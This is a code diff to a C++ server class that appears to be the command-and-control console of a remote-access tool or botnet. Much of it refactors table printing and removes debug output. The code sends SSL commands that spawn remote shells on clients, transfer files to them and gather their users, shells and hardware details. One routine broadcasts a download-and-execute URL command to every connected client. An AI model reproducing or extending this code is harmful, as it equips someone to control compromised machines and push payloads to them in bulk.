@@ -7,57 +7,24 @@ void Server::PrintClientList(){
 		std::cout<<"\n\tNo clients online\n";
 		return;
 	}
-	int iMaxLen = 0;
-	for(int iIt2 = 0; iIt2<Max_Clients; iIt2++){
-		if(Clients[iIt2] != nullptr){
-			if(Clients[iIt2]->isConnected){
-				iMaxLen = int(Clients[iIt2]->strIP.length()) > iMaxLen ? int(Clients[iIt2]->strIP.length()) : iMaxLen;
-			}
-		}
-	}
 	std::vector<std::string> vHeaders;
+	std::vector<std::string> vUsers;
 	vHeaders.push_back("ID");
 	vHeaders.push_back("IP");
 	vHeaders.push_back("OS");
-	int iHeader = vHeaders.size();
-	std::string strPadding = "";
-	std::string strSolidBorder = " +";
-	std::string strCutBorder = " +";
-	strSolidBorder.append(((iMaxLen + 3) * iHeader) -13, '=');
-	strSolidBorder.append(1, '+');
-	strCutBorder.append(((iMaxLen + 3) * iHeader) -13, '-');
-	strCutBorder.append(1, '+');
-	std::cout<<strSolidBorder<<'\n';
-	for(int iIt = 0; iIt<iHeader; iIt++){
-		int iTmpSize = vHeaders[iIt].length();
-		strPadding.erase(strPadding.begin(), strPadding.end());
-		if(iIt == 0){
-			strPadding.append((iMaxLen - iTmpSize) - 12, ' ');
-		} else {
-			strPadding.append(iMaxLen - iTmpSize, ' ');
-		}
-		std::cout<<" | "<<vHeaders[iIt]<<strPadding; //padding goes here
-	}
-	std::cout<<" |\n"<<strSolidBorder<<"\n";
-	for(int iIt3 = 0; iIt3<Max_Clients; iIt3++){
-		if(Clients[iIt3] != nullptr){
-			if(Clients[iIt3]->isConnected){
-				int iTmpSize1 = std::to_string(Clients[iIt3]->iID).length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append((iMaxLen - iTmpSize1) -12, ' ');
-				std::cout<<" | "<<Clients[iIt3]->iID<<strPadding;
-				iTmpSize1 = Clients[iIt3]->strIP.length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append(iMaxLen - iTmpSize1, ' ');
-				std::cout<<" | "<<Clients[iIt3]->strIP<<strPadding;
-				iTmpSize1 = Clients[iIt3]->strOS.length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append(iMaxLen - iTmpSize1, ' ');
-				std::cout<<" | "<<Clients[iIt3]->strOS<<strPadding;
-				std::cout<<" | \n"<<strCutBorder<<'\n';
-			}
+	std::string strTmp = "";
+	for(int iIt = 0; iIt<Max_Clients; iIt++){
+		if(Clients[iIt] != nullptr){
+			strTmp.erase(strTmp.begin(), strTmp.end());
+			strTmp.append(std::to_string(Clients[iIt]->iID));
+			strTmp.append(1, ',');
+			strTmp.append(Clients[iIt]->strIP);
+			strTmp.append(1, ',');
+			strTmp.append(Clients[iIt]->strOS);
+			vUsers.push_back(strTmp);
 		}
 	}
+	Misc::PrintTable(vHeaders, vUsers, ',');
 }
 
 void Server::NullClients(){
@@ -119,15 +86,13 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 	strCmdLine.append(strRemoteFile);
 	strCmdLine.append(1, '@');
 	strCmdLine.append(3, 'A'); //junk to the end mayde randomize letters?
-	std::cout<<"Comand "<<strCmdLine<<'\n';
 	iLen = strCmdLine.length();
 	if(SSL_write(Clients[iClientID]->sslSocket, strCmdLine.c_str(), iLen) > 0){ 
 		sleep(1);
 		char tmpBuffer[4];
 		if(SSL_read(Clients[iClientID]->sslSocket, tmpBuffer, 3) > 2){
-			std::cout<<"Response "<<tmpBuffer<<'\n';
 			if(tmpBuffer[0] == 'f' && tmpBuffer[1] == '@' && tmpBuffer[2] == '1'){
-				std::cout<<"Received confirmation\n";
+				std::cout<<"Transfer confirmation\n";
 			} else {
 				std::cout<<"Not confirmed, cancel transfer...\n";
 				strmInputFile.close();
@@ -269,7 +234,6 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 						//receive confirmation that program is spawned
 						char cConfirm[7];
 						if(SSL_read(Clients[iClientID]->sslSocket, cConfirm, 6) > 0){
-								std::cout<<"response "<<cConfirm<<'\n';
 								if(cConfirm[0] == 'x' && cConfirm[1] == '@' && cConfirm[2] == '1'){						
 									//spawn thread to receive output from shell           
 									isReadingShell = true;
@@ -327,7 +291,6 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					if(SSL_write(Clients[iClientID]->sslSocket, CommandCodes::cReqBasicInfo, 3) > 0){
 						if((iBytes = SSL_read(Clients[iClientID]->sslSocket, cBufferInfo, 1023)) > 0){
 							cBufferInfo[iBytes] = '\0';
-							std::cout<<"Got "<<iBytes<<'\n';
 							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 0 : 1);
 						} else {
 							std::cout<<"Unable to retrieve information from client\n";
@@ -348,6 +311,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 							cBufferFullInfo[iBytes] = '\0';
 							//here parse full info depending wich os
 							//Clients[iClientID]->strOS == "Linux" ? parsefullinfolinux : parsefullinfowindows
+							//not implemented yet
 						} else {
 							std::cout<<"Unable to retrieve information from client\n";
 							error();
@@ -460,7 +424,6 @@ void Server::ParseMassiveCommand(std::string strCommand){
 		system(strTmp.c_str());
 		return;
 	}
-	//upload httpd 
 	if(vcMassiveCommands.size() > 0){
 		if(vcMassiveCommands[0] == "upload"){
 			if(vcMassiveCommands.size() == 7){
@@ -555,14 +518,15 @@ void Server::ParseMassiveCommand(std::string strCommand){
 						}
 					}
 				}
-				std::cout<<strUrl<<' '<<strOS<<'\n';
 				if(strUrl.length() > 0 && strOS != ""){
 					if(iClientsOnline > 0){
 						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
 						std::string strCmdLine = CommandCodes::cHttpd;
+						strCmdLine.append(strUrl);
+						strCmdLine.append(1, '@');
 						strCmdLine.append(1, cExec);
 						strCmdLine.append(1, '@');
-						strCmdLine.append(strUrl);
+						strCmdLine.append(1, 'A');
 						int iLen = strCmdLine.length();
 						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
 							if(Clients[iIt2] != nullptr){
@@ -619,105 +583,22 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 			std::vector<std::string> vcNixInfo;
 			Misc::strSplit(cBuffer, '|', vcNixInfo, 10);
 			if(vcNixInfo.size() >= 8){
-				std::cout<<"\nCurrent User: "<<vcNixInfo[0]<<"\nUsers list:\n";
-				std::vector<std::string> vHeaders, vcUsers, vfUsers, vShells;
-				vHeaders.push_back("Username");
-				vHeaders.push_back("Shell");
-				int iHeader = vHeaders.size(), iMaxLen = 8, iTmpSize1 = 0;
-				Misc::strSplit(vcNixInfo[2].c_str(), '*', vcUsers, 100);
-				for(int iIt = 0; iIt<int(vcUsers.size()); iIt++){
-					std::vector<std::string> vcTmp;
-					Misc::strSplit(vcUsers[iIt].c_str(), ':', vcTmp, 2);
-					if(vcTmp.size() >= 2){
-						iMaxLen = int(vcTmp[0].length()) > iMaxLen ? int(vcTmp[0].length()) : iMaxLen;
-						iMaxLen = int(vcTmp[1].length()) > iMaxLen ? int(vcTmp[1].length()) : iMaxLen;
-						vfUsers.push_back(vcTmp[0]);
-						vShells.push_back(vcTmp[1]);
-					}
-				}
-				std::string strPadding = "", strSolidBorder = " +", strCutBorder = " +";
-				strSolidBorder.append(((iMaxLen + 3) * iHeader) -1, '=');
-				strSolidBorder.append(1, '+');
-				strCutBorder.append(((iMaxLen + 3) * iHeader) -1, '-');
-				strCutBorder.append(1, '+');
-				std::cout<<strSolidBorder<<'\n';
-				
-				iTmpSize1 = vHeaders[0].length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append((iMaxLen - iTmpSize1), ' ');
-				std::cout<<" | "<<vHeaders[0]<<strPadding;
-				iTmpSize1 = vHeaders[1].length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append((iMaxLen - iTmpSize1), ' ');
-				std::cout<<" | "<<vHeaders[1]<<strPadding<<" |\n"<<strSolidBorder<<"\n";
-				
-				for(int iIt2 = 0; iIt2<int(vfUsers.size()); iIt2++){
-					iTmpSize1 = vfUsers[iIt2].length();
-					strPadding.erase(strPadding.begin(), strPadding.end());
-				    strPadding.append((iMaxLen - iTmpSize1), ' ');
-				    std::cout<<" | "<<vfUsers[iIt2]<<strPadding;
-				    iTmpSize1 = vShells[iIt2].length();
-					strPadding.erase(strPadding.begin(), strPadding.end());
-				    strPadding.append((iMaxLen - iTmpSize1), ' ');
-					std::cout<<" | "<<vShells[iIt2]<<strPadding<<" |\n";
-					std::cout<<strCutBorder<<'\n';
-				}
-				//end user table
-				
 				std::cout<<"System:   "<<vcNixInfo[5]<<'\n';
 				std::cout<<"Cpu:      "<<vcNixInfo[3]<<'\n';
 				std::cout<<"Cores:    "<<vcNixInfo[4]<<'\n';
 				std::cout<<"RAM(Mb):  "<<vcNixInfo[6]<<'\n';
-				std::cout<<"System partitions:\n";
-				
-				//partition table
+				std::cout<<"\nCurrent User: "<<vcNixInfo[0]<<"\nUsers list:\n";
+				std::vector<std::string> vHeaders, vcUsers, vfUsers, vShells;
+				vHeaders.push_back("Username");
+				vHeaders.push_back("Shell");
+				Misc::strSplit(vcNixInfo[2].c_str(), '*', vcUsers, 100);
+				Misc::PrintTable(vHeaders, vcUsers, ':');
+				std::cout<<"\nSystem partitions:\n";
 				vHeaders[0] = "Partition";
 				vHeaders[1] = "Size(Gb)";
-				iMaxLen = 9;
-				iHeader = 2;
-				std::vector<std::string> vcPartition, vcPart, vcSize;
-				Misc::strSplit(vcNixInfo[1].c_str(), '*', vcPartition, 100);
-				for(int iIt = 0; iIt<int(vcPartition.size()); iIt++){
-					std::vector<std::string> vcTmp;
-					Misc::strSplit(vcPartition[iIt].c_str(), ':', vcTmp, 2);
-					if(vcTmp.size() >= 2){
-						iMaxLen = int(vcTmp[0].length()) > iMaxLen ? int(vcTmp[0].length()) : iMaxLen;
-						iMaxLen = int(vcTmp[1].length()) > iMaxLen ? int(vcTmp[1].length()) : iMaxLen;
-						vcPart.push_back(vcTmp[0]);
-						vcSize.push_back(vcTmp[1]);
-					}
-				}
-				strSolidBorder.erase(strSolidBorder.begin(), strSolidBorder.end());
-				strCutBorder.erase(strCutBorder.begin(), strCutBorder.end());
-				strSolidBorder = " +";
-				strCutBorder = " +";
-				strSolidBorder.append(((iMaxLen + 3) * iHeader) -1, '=');
-				strSolidBorder.append(1, '+');
-				strCutBorder.append(((iMaxLen + 3) * iHeader) -1, '-');
-				strCutBorder.append(1, '+');
-				
-				std::cout<<strSolidBorder<<'\n';
-				iTmpSize1 = vHeaders[0].length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append((iMaxLen - iTmpSize1), ' ');
-				std::cout<<" | "<<vHeaders[0]<<strPadding;
-				iTmpSize1 = vHeaders[1].length();
-				strPadding.erase(strPadding.begin(), strPadding.end());
-				strPadding.append((iMaxLen - iTmpSize1), ' ');
-				std::cout<<" | "<<vHeaders[1]<<strPadding<<" |\n"<<strSolidBorder<<"\n";
-				
-				for(int iIt2 = 0; iIt2<int(vcPart.size()); iIt2++){
-					iTmpSize1 = vcPart[iIt2].length();
-					strPadding.erase(strPadding.begin(), strPadding.end());
-				    strPadding.append((iMaxLen - iTmpSize1), ' ');
-				    std::cout<<" | "<<vcPart[iIt2]<<strPadding;
-				    iTmpSize1 = vcSize[iIt2].length();
-					strPadding.erase(strPadding.begin(), strPadding.end());
-				    strPadding.append((iMaxLen - iTmpSize1), ' ');
-					std::cout<<" | "<<vcSize[iIt2]<<strPadding<<" |\n";
-					std::cout<<strCutBorder<<'\n';
-				}
-				//end parition table
+				std::vector<std::string> vcPartitions;
+				Misc::strSplit(vcNixInfo[1].c_str(), '*', vcPartitions, 100);
+				Misc::PrintTable(vHeaders, vcPartitions, ':');
 			} else {
 				std::cout<<"Error\n"<<cBuffer<<'\n';
 			}
@@ -928,9 +809,9 @@ void Server::threadMasterCMD(){
 			close(sckMainSocket);
 			break;
 		}
-		if(iClientsOnline == 0){
-			continue;
-		}
+		//if(iClientsOnline == 0){
+		//	continue;
+		//}
 		//interact with clients
 		if(vcCommands[0] == "cli"){
 			if(vcCommands.size() == 5){ //cli -c id -a action
